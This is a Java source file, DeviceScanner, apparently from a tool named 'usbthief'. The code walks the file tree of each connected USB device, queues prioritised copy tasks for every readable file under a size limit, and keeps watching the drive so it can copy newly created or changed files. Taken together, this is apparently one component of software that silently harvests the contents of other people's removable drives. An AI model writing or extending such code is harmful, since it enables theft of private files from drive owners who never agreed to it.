package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.statistics.Statistics;

import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.time.Instant;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.Logger;
import java.util.HashMap;
import java.util.Map;

public class DeviceScanner extends Thread{
    public static final Logger logger = Logger.getLogger(DeviceScanner.class.getName());

    private final FileStore rootStore;
    private final Path root;
    private final DiskViewer visitor = new DiskViewer();
    private final WatchService monitor;

    private final AtomicInteger changeCount = new AtomicInteger(0);
    private final Map<Path, WatchKey> watchKeys = new HashMap<>();
    private volatile boolean running = true;
    private final com.superredrock.usbthief.core.Device device;

    public DeviceScanner(com.superredrock.usbthief.core.Device device, FileStore rootStore) {
        super(QueueManager.getDiskScanners(), "DiskScanner: " + rootStore.name());
        this.device = device;
        this.rootStore = rootStore;
        this.root = device.getRootPath();
        WatchService ws;
        try {
            ws = FileSystems.getDefault().newWatchService();
        } catch (IOException e) {
            logger.warning("Failed to create WatchService: " + e.getMessage());
            ws = null;
        }
        this.monitor = ws;
    }

    @Override
    public void run() {


        logger.info("Scanning Disk " + root);
        try {
            Files.walkFileTree(root, this.visitor);
        } catch (IOException e) {
            logger.severe("Error while scanning disk: " + e.getMessage());
            return;
        }

        if (!ConfigManager.getInstance().get(ConfigSchema.WATCH_ENABLED)) {
            logger.info("File monitoring disabled, scanner finished");
            return;
        }

        logger.info("Starting file monitoring for " + root);

        if (monitor == null) {
            logger.warning("WatchService not available, skipping file monitoring");
        }else {
            startMonitoring();
        }

    }

    private void startMonitoring() {
        Thread resetThread = getResetThread();
        resetThread.start();

        try {
            while (running && !Thread.currentThread().isInterrupted()) {
                WatchKey key = monitor.take();
                Path watchPath = (Path) key.watchable();

                for (WatchEvent<?> event : key.pollEvents()) {
                    handleWatchEvent(watchPath, event);
                }

                if (!key.reset()) {
                    watchKeys.remove(watchPath);
                    if (watchKeys.isEmpty()) {
                        logger.info("All watch keys cancelled, stopping monitor");
                        break;
                    }
                }
            }
        } catch (ClosedWatchServiceException e) {
            logger.info("WatchService closed");
        } catch (InterruptedException e) {
            logger.info("Monitoring interrupted");
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            logger.severe("Error in monitoring loop: " + e.getMessage());
        } finally {
            running = false;
            closeWatchService();
        }
    }

    private Thread getResetThread() {
        Thread resetThread = new Thread(() -> {
            while (running) {
                try {
                    TimeUnit.SECONDS.sleep(ConfigManager.getInstance().get(ConfigSchema.WATCH_RESET_INTERVAL_SECONDS));
                    int count = changeCount.getAndSet(0);
                    if (count > 0) {
                        logger.fine("Reset change count: " + count);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "ChangeCounterReset");
        resetThread.setDaemon(true);
        return resetThread;
    }

    private void handleWatchEvent(Path watchPath, WatchEvent<?> event) {
        WatchEvent.Kind<?> kind = event.kind();

        if (kind == StandardWatchEventKinds.OVERFLOW) {
            logger.warning("WatchEvent overflow detected");
            return;
        }

        @SuppressWarnings("unchecked")
        WatchEvent<Path> ev = (WatchEvent<Path>) event;
        Path fullPath = watchPath.resolve(ev.context());

        try {
            if (!Files.exists(fullPath) || Files.isHidden(fullPath)) {
                return;
            }
        } catch (IOException e) {
            return;
        }

        int newCount = changeCount.incrementAndGet();
        logger.fine("File event: " + kind + " on " + fullPath + " (count: " + newCount + ")");

        if (newCount >= ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD)) {
            int threshold = ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD);
            logger.info("Change threshold reached (" + threshold + "), triggering copy");
            changeCount.set(0);
            handleChangedPath(fullPath, kind);
        }
    }

    private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
        try {
            if (Files.isDirectory(path)) {
                if (kind == StandardWatchEventKinds.ENTRY_CREATE) {
                    registerDirectoryWatch(path);
                    Files.walkFileTree(path, new SimpleFileVisitor<Path>() {
                        @Override
                        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
                            if (!Files.isHidden(dir)) {
                                // Use TaskScheduler with priority
                                CopyTask rawTask = new CopyTask(dir, device.getSerialNumber());
                                int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(dir);
                                PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
                                TaskScheduler.getInstance().submit(priorityTask);
                            }
                            return FileVisitResult.CONTINUE;
                        }

                        @Override
                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                            long size = Files.size(file);
                            if (Files.isReadable(file) && size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)) {
                                Statistics.getInstance().recordFileDiscovered(size);
                                CopyTask rawTask = new CopyTask(file, device.getSerialNumber());
                                int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(file);
                                PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
                                TaskScheduler.getInstance().submit(priorityTask);
                            }
                            return FileVisitResult.CONTINUE;
                        }
                    });
                }
            } else if (Files.isRegularFile(path)) {
                long size = Files.size(path);
                if (Files.isReadable(path) && size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)) {
                    Statistics.getInstance().recordFileDiscovered(size);
                    CopyTask rawTask = new CopyTask(path, device.getSerialNumber());
                    int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(path);
                    PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
                    TaskScheduler.getInstance().submit(priorityTask);
                }
            }
        } catch (IOException e) {
            logger.warning("Error handling changed path: " + e.getMessage());
        }
    }

    private void registerDirectoryWatch(Path dir) throws IOException {
        if (monitor == null) {
            return;
        }
        if (!watchKeys.containsKey(dir)) {
            WatchKey key = dir.register(monitor,
                StandardWatchEventKinds.ENTRY_CREATE,
                StandardWatchEventKinds.ENTRY_MODIFY,
                StandardWatchEventKinds.ENTRY_DELETE);
            watchKeys.put(dir, key);
            logger.fine("Registered watch for directory: " + dir);
        }
    }

    public FileStore getRootStore() {
        return rootStore;
    }

    public void stopMonitoring() {
        running = false;
        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warning("Error closing WatchService: " + e.getMessage());
            }
        }
    }

    private void closeWatchService() {
        for (WatchKey key : watchKeys.values()) {
            key.cancel();
        }
        watchKeys.clear();
        try {
            monitor.close();
        } catch (IOException e) {
            logger.warning("Error closing WatchService: " + e.getMessage());
        }
    }

    protected class DiskViewer extends SimpleFileVisitor<Path> {
        private final Logger logger = DeviceScanner.logger;

        @Override
        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
            if (!Files.isReadable(file)){
                logger.info("Skip Unreadable file " + file);
                return FileVisitResult.SKIP_SIBLINGS;
            }

        try {
            long size = Files.size(file);
            if(size != 0 && size < ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE)){
                Statistics.getInstance().recordFileDiscovered(size);
                CopyTask rawTask = new CopyTask(file, device.getSerialNumber());
                    int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(file);
                    PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
                    TaskScheduler.getInstance().submit(priorityTask);
                }
            } catch (IOException e) {
                logger.warning("Error visiting file: " + e.getMessage());
                return FileVisitResult.SKIP_SUBTREE;
            }
            return FileVisitResult.CONTINUE;
        }

        @Override
        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
            if (Files.isHidden(dir)){
                logger.info("Skip hiding dir " + dir);
                return FileVisitResult.SKIP_SUBTREE;
            }
            // Use TaskScheduler with priority
            CopyTask rawTask = new CopyTask(dir, device.getSerialNumber());
            int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(dir);
            PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
            TaskScheduler.getInstance().submit(priorityTask);
            registerDirectoryWatch(dir);
            logger.info("Found " + dir);
            return FileVisitResult.CONTINUE;
        }
    }
}
